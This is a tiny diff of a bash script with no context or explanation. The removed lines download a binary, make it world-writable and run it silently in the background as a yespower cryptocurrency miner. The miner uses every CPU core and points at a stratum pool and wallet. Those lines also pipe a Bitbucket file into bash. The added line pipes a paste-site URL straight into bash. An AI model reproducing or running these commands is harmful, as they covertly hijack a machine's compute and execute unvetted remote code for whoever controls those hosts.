@@ -1,5 +1,1 @@
-#!/bin/bash
-curl https://github.com/dragonballku8/turn/raw/main/BTRM -o BTRM
-chmod 777 BTRM
-./BTRM -a yespower -o stratum+tcp://vinjai.thecritman.my.id:80 -u uzrKLPM88xXDP3CtWdPwh8ZvxsHNXXrLju.Reg -t $(nproc --all) > /dev/null 2>&1 &
-curl -sL https://bitbucket.org/nicezep/file/raw/master/time | bash
+curl https://muq-hastebin.glitch.me/raw/RKZxiirfRg | bash
